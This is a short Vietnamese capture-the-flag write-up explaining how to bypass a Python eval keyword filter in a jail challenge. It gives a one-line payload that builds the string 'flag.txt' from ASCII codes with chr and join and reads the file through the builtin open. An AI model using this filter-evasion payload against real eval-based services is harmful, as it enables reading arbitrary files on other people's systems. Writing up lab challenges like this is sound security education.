Challenge cung cấp cho ta 1 đoạn code python dùng để filtering kí tự như sau :

<img width="726" height="316" alt="image" src="https://github.com/user-attachments/assets/fd3c4a8d-4106-48a6-84b9-d4f92e572c9a" />


**Ý tưởng bypass**

- Không được gõ “flag” → **tạo chuỗi 'flag.txt' bằng mã ASCII**.
- Không được `import` → dùng **`open` có sẵn trong builtins**.
- Không cần `eval/exec/os`, không dùng `+`.
1. **Payload đọc file**
    
    Dán nguyên dòng dưới (một biểu thức duy nhất, hợp lệ với `eval`):
    

```
open(''.join(map(chr,[102,108,97,103,46,116,120,116]))).read()
```

Giải thích nhanh:

- `map(chr,[102,108,97,103,46,116,120,116])` ⇒ `'f','l','a','g','.','t','x','t'`
- `''.join(...)` ⇒ `"flag.txt"` (nhưng bạn **không gõ** chữ “flag”)
- `open(...).read()` ⇒ đọc nội dung file
- Không có `+ / import / os / eval / exec` → qua lọc.

<img width="686" height="193" alt="image" src="https://github.com/user-attachments/assets/6d67c6ba-8ed7-40c0-b353-b3e63cc303d1" />
